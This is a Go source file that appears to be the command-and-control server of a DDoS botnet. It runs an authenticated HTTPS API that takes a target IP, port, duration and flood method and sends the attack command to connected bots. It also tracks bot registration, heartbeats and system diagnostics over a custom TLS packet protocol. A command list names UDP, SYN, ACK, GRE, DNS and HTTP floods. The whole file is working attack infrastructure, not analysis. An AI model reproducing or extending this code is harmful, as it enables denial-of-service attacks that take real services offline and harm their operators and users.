package main

import (
	"crypto/sha256"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"strconv"
	"sync"
	"sync/atomic"
	"time"
)

type ConnectionPool struct {
	pool        map[string]*PooledConn
	mutex       sync.RWMutex
	maxSize     int
	currentSize int32
}

type PooledConn struct {
	conn     *tls.Conn
	lastUsed time.Time
}

type APIServer struct {
	port    string
	server  *http.Server
	started bool
}

type APIResponse struct {
	Success bool        `json:"success"`
	Message string      `json:"message,omitempty"`
	Data    interface{} `json:"data,omitempty"`
}

type AttackRequest struct {
	Method   string `json:"method"`
	TargetIP string `json:"target_ip"`
	Port     int    `json:"port"`
	Duration int    `json:"duration"`
	Username string `json:"username"`
	Token    string `json:"token"`
	Secret   string `json:"secret"`
}

type BotInfo struct {
	ID         string     `json:"id"`
	IP         string     `json:"ip"`
	Connected  time.Time  `json:"connected"`
	LastPing   time.Time  `json:"last_ping"`
	Status     string     `json:"status"`
	PingMs     int64      `json:"ping_ms"`
	SystemInfo SystemInfo `json:"system_info,omitempty"`
}

type SystemInfo struct {
	OS     string `json:"os"`
	Arch   string `json:"arch"`
	CPU    string `json:"cpu,omitempty"`
	RAM    string `json:"ram,omitempty"`
	Uptime string `json:"uptime,omitempty"`
	Load1  string `json:"load_1,omitempty"`
	Load5  string `json:"load_5,omitempty"`
	Load15 string `json:"load_15,omitempty"`
	Disk   string `json:"disk_usage,omitempty"`
}

type StatsResponse struct {
	TotalBots     int    `json:"total_bots"`
	ActiveBots    int    `json:"active_bots"`
	TotalAttacks  int    `json:"total_attacks"`
	ActiveAttacks int    `json:"active_attacks"`
	Uptime        string `json:"uptime"`
}

var (
	ongoingAttacksMutex sync.RWMutex
	// ongoingAPIAttacksMutex sync.RWMutex
	attackHistoryMutex sync.RWMutex
	clientsMutex       sync.RWMutex
	botPingTrackerMu   sync.Mutex
	botPingTracker     = make(map[string]time.Time)
)

type AuthPacket struct {
	BotID string `json:"bot_id"`
}

const (
	MaxBotInfoEntries = 50000
	MaxAPIAttacks     = 1000
)

const (
	PacketTypePing         = 0x01
	PacketTypePong         = 0x02
	PacketTypeCommand      = 0x03
	PacketTypeDiagnostic   = 0x04
	PacketTypeHeartbeat    = 0x05
	PacketTypeAuth         = 0x06
	PacketTypeAuthResponse = 0x07
)

type PacketHeader struct {
	Type      uint8
	Length    uint32
	Timestamp int64
	Checksum  uint16
}

type Packet struct {
	Header  PacketHeader
	Payload []byte
}

var (
	apiServer       *APIServer
	botInfoMap      = make(map[string]BotInfo)
	botInfoLock     sync.RWMutex
	serverStartTime time.Time
	connectionPool  = NewConnectionPool(1000)

	ErrInvalidPacket    = errors.New("invalid packet")
	ErrChecksumMismatch = errors.New("checksum mismatch")
	ErrPacketTooSmall   = errors.New("packet too small")
)

func init() {
	serverStartTime = time.Now()
}

func NewConnectionPool(maxSize int) *ConnectionPool {
	return &ConnectionPool{
		pool:        make(map[string]*PooledConn),
		maxSize:     maxSize,
		currentSize: 0,
	}
}

func (p *ConnectionPool) StartCleanupRoutine(interval time.Duration) {
	go func() {
		ticker := time.NewTicker(interval)
		defer ticker.Stop()

		for range ticker.C {
			p.cleanup()
		}
	}()
}

func (p *ConnectionPool) Get(addr string) (*tls.Conn, bool) {
	p.mutex.RLock()
	defer p.mutex.RUnlock()

	if pooled, exists := p.pool[addr]; exists {
		if pooled.conn != nil {
			pooled.lastUsed = time.Now()
			return pooled.conn, true
		}
	}
	return nil, false
}

func (p *ConnectionPool) Put(addr string, conn *tls.Conn) error {
	p.mutex.Lock()
	defer p.mutex.Unlock()

	if atomic.LoadInt32(&p.currentSize) >= int32(p.maxSize) {
		return fmt.Errorf("connection pool full")
	}

	if existing, exists := p.pool[addr]; exists {
		existing.conn.Close()
	}

	p.pool[addr] = &PooledConn{
		conn:     conn,
		lastUsed: time.Now(),
	}
	atomic.AddInt32(&p.currentSize, 1)
	return nil
}

func (p *ConnectionPool) Remove(addr string) {
	p.mutex.Lock()
	defer p.mutex.Unlock()
	if pooled, exists := p.pool[addr]; exists {
		pooled.conn.Close()
		delete(p.pool, addr)
		atomic.AddInt32(&p.currentSize, -1)
	}
}

func (p *ConnectionPool) cleanup() {
	p.mutex.Lock()
	defer p.mutex.Unlock()
	now := time.Now()
	for addr, pooled := range p.pool {
		if now.Sub(pooled.lastUsed) > 5*time.Minute {
			pooled.conn.Close()
			delete(p.pool, addr)
			atomic.AddInt32(&p.currentSize, -1)
		}
	}
}

func (p *ConnectionPool) CloseAll() {
	p.mutex.Lock()
	defer p.mutex.Unlock()
	for _, pooled := range p.pool {
		pooled.conn.Close()
	}
	p.pool = make(map[string]*PooledConn)
}

func NewAPIServer(port string) *APIServer {
	return &APIServer{
		port: port,
	}
}

func (s *APIServer) Start() error {
	if s.started {
		return fmt.Errorf("API server already running")
	}
	mux := http.NewServeMux()
	mux.HandleFunc("/api/attack", s.rateLimitMiddleware(s.attackHandler))
	mux.HandleFunc("/api/bots", s.rateLimitMiddleware(s.botsHandler))
	mux.HandleFunc("/api/stats", s.rateLimitMiddleware(s.statsHandler))

	s.server = &http.Server{
		Addr:    ":" + s.port,
		Handler: mux,
	}
	s.started = true

	go func() {
		fmt.Printf("[API] Server starting on port %s (HTTPS)\n", s.port)
		if err := s.server.ListenAndServeTLS(CERT_FILE, KEY_FILE); err != nil && err != http.ErrServerClosed {
			fmt.Printf("[API] Error starting server: %v\n", err)
			s.started = false
		}
	}()

	return nil
}

func (s *APIServer) attackHandler(w http.ResponseWriter, r *http.Request) {
	token := r.Header.Get("X-API-Token")
	if allowed, remaining := CheckAPIRateLimit(token); !allowed {
		s.sendError(w, fmt.Sprintf("API rate limit exceeded. Try again in %v", remaining), http.StatusTooManyRequests)
		return
	}
	if r.Method != http.MethodPost {
		s.sendError(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var req AttackRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		s.sendError(w, "Invalid JSON", http.StatusBadRequest)
		return
	}
	if req.Method == "" || req.TargetIP == "" || req.Port <= 0 || req.Duration <= 0 || req.Username == "" || req.Token == "" || req.Secret == "" {
		s.sendError(w, "Missing required fields", http.StatusBadRequest)
		return
	}
	if ip := net.ParseIP(req.TargetIP); ip != nil {
		if ip.IsLoopback() || ip.IsPrivate() || ip.IsMulticast() {
			s.sendError(w, "Target IP not allowed", http.StatusBadRequest)
			return
		}
	}
	if req.Port < 1 || req.Port > 65535 {
		s.sendError(w, "Port out of range", http.StatusBadRequest)
		return
	}
	attackDuration := int64(req.Duration) * int64(time.Second)
	if attackDuration < 0 {
		s.sendError(w, "Duration too large", http.StatusBadRequest)
		return
	}

	if !ValidateMethod(req.Method) {
		s.sendError(w, "Unknown method", http.StatusBadRequest)
		return
	}
	if !s.authenticate(req.Token, req.Secret, req.Username) {
		s.sendError(w, "Authentication failed", http.StatusUnauthorized)
		return
	}
	users, err := loadUsers()
	if err != nil {
		s.sendError(w, "Internal server error", http.StatusInternalServerError)
		return
	}
	var user *User
	for _, u := range users {
		if u.Username == req.Username {
			user = &u
			break
		}
	}
	if user == nil || !user.CanUseMethod(req.Method) {
		s.sendError(w, "Permission denied for this method", http.StatusForbidden)
		return
	}
	ip := net.ParseIP(req.TargetIP)
	if ip == nil {
		s.sendError(w, "Invalid IP address", http.StatusBadRequest)
		return
	}
	if !ValidateIP(req.TargetIP) {
		s.sendError(w, "Target IP not allowed", http.StatusBadRequest)
		return
	}

	ip4 := ip.To4()
	if ip4 == nil {
		s.sendError(w, "IPv4 address required", http.StatusBadRequest)
		return
	}
	cmdPacket := CommandPacket{}
	copy(cmdPacket.Method[:], req.Method[:len(cmdPacket.Method)])
	copy(cmdPacket.TargetIP[:], ip4)
	cmdPacket.Port = uint16(req.Port)
	cmdPacket.Duration = uint32(req.Duration)
	sendToBots(cmdPacket)
	a := Attack{
		method:   req.Method,
		ip:       req.TargetIP,
		port:     strconv.Itoa(req.Port),
		duration: time.Duration(req.Duration) * time.Second,
		start:    time.Now(),
		user:     req.Username,
	}

	historyLock.Lock()
	attackHistory = append(attackHistory, a)
	historyLock.Unlock()
	RecordAPIAttack(a)
	s.sendResponse(w, APIResponse{
		Success: true,
		Message: "Attack launched successfully",
	}, http.StatusOK)
}

func (s *APIServer) botsHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		s.sendError(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	token := r.URL.Query().Get("token")
	secret := r.URL.Query().Get("secret")
	username := r.URL.Query().Get("username")

	if token == "" || secret == "" || username == "" {
		s.sendError(w, "Missing token/secret/username", http.StatusBadRequest)
		return
	}
	if !s.authenticate(token, secret, username) {
		s.sendError(w, "Authentication failed", http.StatusUnauthorized)
		return
	}

	botList := GetActiveBotInfos()
	s.sendResponse(w, APIResponse{Success: true, Data: botList}, http.StatusOK)
}

func (s *APIServer) statsHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		s.sendError(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	token := r.URL.Query().Get("token")
	secret := r.URL.Query().Get("secret")
	username := r.URL.Query().Get("username")
	if token == "" || secret == "" || username == "" {
		s.sendError(w, "Missing token/secret/username", http.StatusBadRequest)
		return
	}

	if !s.authenticate(token, secret, username) {
		s.sendError(w, "Authentication failed", http.StatusUnauthorized)
		return
	}

	botSummary := heartbeatManager.GetBotStatusSummary()
	ongoingAPIAttacksMutex.RLock()
	activeAPIAttacks := len(ongoingAPIAttacks)
	ongoingAPIAttacksMutex.RUnlock()

	attackLock.Lock()
	activeStandardAttacks := len(ongoingAttacks)
	attackLock.Unlock()

	historyLock.Lock()
	totalAttacks := len(attackHistory)
	historyLock.Unlock()

	uptime := time.Since(serverStartTime)

	stats := StatsResponse{
		TotalBots:     botSummary["TOTAL"],
		ActiveBots:    botSummary["ONLINE"] + botSummary["LAGGING"],
		TotalAttacks:  totalAttacks,
		ActiveAttacks: activeStandardAttacks + activeAPIAttacks,
		Uptime:        uptime.Truncate(time.Second).String(),
	}
	s.sendResponse(w, APIResponse{
		Success: true,
		Data:    stats,
	}, http.StatusOK)
}

func (s *APIServer) authenticate(token, secret, username string) bool {
	storedSecret, exists := secretManager.GetSecret(username + "_api_secret")
	if exists && SecureCompare(storedSecret, secret) {
		return true
	}

	users, err := loadUsers()
	if err != nil {
		return false
	}

	for _, user := range users {
		if user.Username == username {
			if token != user.APIToken {
				return false
			}
			return VerifyAPISecret(user.APISecret, secret)
		}
	}
	return false
}

func (s *APIServer) rateLimitMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		ip, _, _ := net.SplitHostPort(r.RemoteAddr)
		if allowed, remaining := CheckConnectionRateLimit(ip); !allowed {
			s.sendError(w, fmt.Sprintf("Rate limit exceeded. Try again in %v", remaining), http.StatusTooManyRequests)
			return
		}
		next(w, r)
	}
}

func (s *APIServer) sendResponse(w http.ResponseWriter, response APIResponse, statusCode int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	json.NewEncoder(w).Encode(response)
}

func (s *APIServer) sendError(w http.ResponseWriter, message string, statusCode int) {
	s.sendResponse(w, APIResponse{
		Success: false,
		Message: message,
	}, statusCode)
}

func UpdateBotInfo(botID string, remoteAddr net.Addr, info SystemInfo) {
	botInfoLock.Lock()
	defer botInfoLock.Unlock()

	existing, exists := botInfoMap[botID]
	if !exists {
		existing = BotInfo{
			ID:        botID,
			Connected: time.Now(),
		}
	}

	if existing.Connected.IsZero() {
		existing.Connected = time.Now()
	}

	if tcpAddr, ok := remoteAddr.(*net.TCPAddr); ok && tcpAddr.IP != nil {
		existing.IP = tcpAddr.IP.String()
	}

	existing.LastPing = time.Now()
	existing.Status = "ONLINE"
	existing.SystemInfo = info

	botInfoMap[botID] = existing
}

func UpdateBotPing(botID string, ping time.Duration) {
	botInfoLock.Lock()
	defer botInfoLock.Unlock()

	if bot, exists := botInfoMap[botID]; exists {
		bot.LastPing = time.Now()
		if ping >= 0 {
			bot.PingMs = ping.Milliseconds()
		}
		bot.Status = "ONLINE"
		botInfoMap[botID] = bot
		return
	}

	pingMs := int64(0)
	if ping >= 0 {
		pingMs = ping.Milliseconds()
	}

	botInfoMap[botID] = BotInfo{
		ID:        botID,
		Connected: time.Now(),
		LastPing:  time.Now(),
		Status:    "ONLINE",
		PingMs:    pingMs,
	}
}

func RemoveBotInfo(botID string) {
	botInfoLock.Lock()
	delete(botInfoMap, botID)
	botInfoLock.Unlock()
}

func RecordBotConnection(botID string, addr net.Addr) {
	botInfoLock.Lock()
	defer botInfoLock.Unlock()

	entry, exists := botInfoMap[botID]
	if !exists {
		entry = BotInfo{ID: botID, Connected: time.Now()}
	}

	if entry.Connected.IsZero() {
		entry.Connected = time.Now()
	}

	if tcpAddr, ok := addr.(*net.TCPAddr); ok && tcpAddr.IP != nil {
		entry.IP = tcpAddr.IP.String()
	}

	entry.LastPing = time.Now()
	entry.Status = "ONLINE"
	botInfoMap[botID] = entry
}

func GetActiveBotInfos() []BotInfo {
	botInfoLock.RLock()
	snapshot := make(map[string]BotInfo, len(botInfoMap))
	for id, info := range botInfoMap {
		snapshot[id] = info
	}
	botInfoLock.RUnlock()

	heartbeatSnapshot := heartbeatManager.GetDetailedBotStatus()
	now := time.Now()
	bots := make([]BotInfo, 0, len(snapshot))

	for id, info := range snapshot {
		if detail, exists := heartbeatSnapshot[id]; exists {
			if !detail.Live {
				continue
			}
			info.Status = detail.Status
			info.LastPing = detail.LastHeartbeat
			info.PingMs = detail.PingMS
			bots = append(bots, info)
			continue
		}

		if now.Sub(info.LastPing) > offlineThreshold {
			continue
		}

		bots = append(bots, info)
	}

	return bots
}

func CalculateChecksum(data []byte) uint16 {
	hash := sha256.Sum256(data)
	return binary.BigEndian.Uint16(hash[:2])
}

func SerializePacket(packet Packet) ([]byte, error) {
	buf := make([]byte, 19+packet.Header.Length)
	buf[0] = packet.Header.Type
	binary.BigEndian.PutUint32(buf[1:5], packet.Header.Length)
	binary.BigEndian.PutUint64(buf[5:13], uint64(packet.Header.Timestamp))
	binary.BigEndian.PutUint16(buf[17:19], packet.Header.Checksum)
	copy(buf[19:], packet.Payload)

	return buf, nil
}

func DeserializePacket(data []byte) (Packet, error) {
	if len(data) < 19 {
		return Packet{}, ErrPacketTooSmall
	}
	var packet Packet
	packet.Header.Type = data[0]
	packet.Header.Length = binary.BigEndian.Uint32(data[1:5])
	packet.Header.Timestamp = int64(binary.BigEndian.Uint64(data[5:13]))
	packet.Header.Checksum = binary.BigEndian.Uint16(data[17:19])

	if len(data) < int(19+packet.Header.Length) {
		return Packet{}, ErrInvalidPacket
	}
	packet.Payload = make([]byte, packet.Header.Length)
	copy(packet.Payload, data[19:19+packet.Header.Length])
	checksumData := append(data[0:17], data[19:19+packet.Header.Length]...)
	if CalculateChecksum(checksumData) != packet.Header.Checksum {
		return Packet{}, ErrChecksumMismatch
	}

	return packet, nil
}

func CreatePacket(packetType uint8, payload []byte) Packet {
	timestamp := time.Now().UnixNano()
	packet := Packet{
		Header: PacketHeader{
			Type:      packetType,
			Length:    uint32(len(payload)),
			Timestamp: timestamp,
			Checksum:  0,
		},
		Payload: payload,
	}
	tempBuf := make([]byte, 19+packet.Header.Length)
	tempBuf[0] = packet.Header.Type
	binary.BigEndian.PutUint32(tempBuf[1:5], packet.Header.Length)
	binary.BigEndian.PutUint64(tempBuf[5:13], uint64(packet.Header.Timestamp))
	copy(tempBuf[19:], packet.Payload)
	packet.Header.Checksum = CalculateChecksum(append(tempBuf[0:17], tempBuf[19:]...))

	return packet
}

func SendPacket(conn net.Conn, packet Packet) error {
	data, err := SerializePacket(packet)
	if err != nil {
		LogSystem("ERROR", "Packet serialization failed", err.Error())
		return err
	}
	_, err = conn.Write(data)
	if err != nil {
		LogSystem("ERROR", "Packet send failed", err.Error())
		return err
	}

	return nil
}

func ReceivePacket(conn net.Conn) (Packet, error) {
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	defer conn.SetReadDeadline(time.Time{})
	headerBuf := make([]byte, 19)
	if _, err := io.ReadFull(conn, headerBuf); err != nil {
		return Packet{}, err
	}
	length := binary.BigEndian.Uint32(headerBuf[1:5])
	if length > 16*1024 {
		return Packet{}, fmt.Errorf("packet too large")
	}
	payloadBuf := make([]byte, length)
	if length > 0 {
		if _, err := io.ReadFull(conn, payloadBuf); err != nil {
			return Packet{}, err
		}
	}
	fullPacket := append(headerBuf, payloadBuf...)
	return DeserializePacket(fullPacket)
}

func validateCommand(method string) bool {
	validCommands := map[string]bool{
		"!udpsmart":  true,
		"!udpflood":  true,
		"!tcpflood":  true,
		"!synflood":  true,
		"!ackflood":  true,
		"!greflood":  true,
		"!dns":       true,
		"!http":      true,
		"!reinstall": true,
		"STOP":       true,
	}
	return validCommands[method]
}

func handleBotConnection(conn *tls.Conn) {
	defer conn.Close()
	botID, err := parseBotAuth(conn)
	if err != nil {
		LogBotConnection(conn.RemoteAddr().String(), false)
		LogSystem("warn", "Bot authentication failed", map[string]interface{}{"ip": conn.RemoteAddr().String(), "error": err.Error()})
		return
	}

	botManager.AddBot(botID, conn)
	RecordBotConnection(botID, conn.RemoteAddr())
	defer func() {
		botManager.RemoveBot(botID)
		heartbeatManager.RemoveBot(botID)
		RemoveBotInfo(botID)
		LogBotConnection(conn.RemoteAddr().String(), false)
		LogSystem("info", "Bot disconnected and cleaned up", map[string]interface{}{"botID": botID})
	}()

	LogBotConnection(conn.RemoteAddr().String(), true)
	LogSystem("info", "Bot authenticated successfully", map[string]interface{}{"botID": botID, "ip": conn.RemoteAddr().String()})
	heartbeatManager.UpdateBot(botID, time.Now(), 0) // Initial heartbeat

	stopHeartbeat := make(chan struct{})
	go monitorBotHeartbeat(conn, botID, stopHeartbeat)
	defer close(stopHeartbeat)

	// Request diagnostics
	if err := RequestDiagnostics(conn); err != nil {
		// It's not fatal, just log it
		LogSystem("info", "Failed to request diagnostics from bot", map[string]interface{}{"botID": botID, "error": err.Error()})
	}

	// Main packet handling loop
	for {
		packet, err := ReceivePacket(conn)
		if err != nil {
			// Bot disconnected, the deferred cleanup will handle removal.
			LogSystem("info", "Bot receive packet error, disconnecting", map[string]interface{}{"botID": botID, "error": err.Error()})
			return
		}
		if err := handleAuthenticatedBotPacket(conn, packet, botID); err != nil {
			LogSystem("warn", "Error handling authenticated packet", map[string]interface{}{"botID": botID, "error": err.Error()})
			// Depending on the error, we might want to disconnect the bot.
			// For now, we'll just log it.
		}
	}
}

func parseBotAuth(conn net.Conn) (string, error) {
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	defer conn.SetReadDeadline(time.Time{})

	packet, err := ReceivePacket(conn)
	if err != nil {
		return "", fmt.Errorf("failed to receive auth packet: %w", err)
	}

	if packet.Header.Type != PacketTypeAuth {
		return "", fmt.Errorf("expected auth packet type %d, but got %d", PacketTypeAuth, packet.Header.Type)
	}

	// For now, bot ID is in payload. This can be improved.
	botID := string(packet.Payload)
	if botID == "" {
		return "", errors.New("authentication failed: bot ID is empty")
	}

	// Send auth response
	authRespPacket := CreatePacket(PacketTypeAuthResponse, []byte("OK"))
	if err := SendPacket(conn, authRespPacket); err != nil {
		return "", fmt.Errorf("failed to send auth response to bot %s: %w", botID, err)
	}

	return botID, nil
}

func handleAuthenticatedBotPacket(conn net.Conn, packet Packet, botID string) error {
	switch packet.Header.Type {
	case PacketTypePong:
		// If the botID is empty, attempt to lookup by connection
		if botID == "" {
			botID = botManager.GetBotIDByConn(conn)
		}
		var pingDuration time.Duration = -1
		botPingTrackerMu.Lock()
		if start, exists := botPingTracker[botID]; exists {
			pingDuration = time.Since(start)
			delete(botPingTracker, botID)
		}
		botPingTrackerMu.Unlock()
		// Inferred from ping response
		heartbeatManager.UpdateBot(botID, time.Now(), pingDuration)
		UpdateBotPing(botID, pingDuration)
	case PacketTypeDiagnostic:
		HandleDiagnosticResponse(botID, conn, packet)
	case PacketTypeHeartbeat:
		// This could be a proactive heartbeat from the bot
		if botID == "" {
			botID = botManager.GetBotIDByConn(conn)
		}
		heartbeatManager.UpdateBot(botID, time.Now(), 0)
		UpdateBotPing(botID, -1)
	default:
		// Handle other packet types if necessary
	}
	return nil
}

func monitorBotHeartbeat(conn net.Conn, botID string, stop <-chan struct{}) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			pingPacket := CreatePacket(PacketTypePing, nil)
			start := time.Now()
			if err := SendPacket(conn, pingPacket); err != nil {
				// Bot is likely disconnected
				return
			}
			botPingTrackerMu.Lock()
			botPingTracker[botID] = start
			botPingTrackerMu.Unlock()
		case <-stop:
			return
		}
	}
}
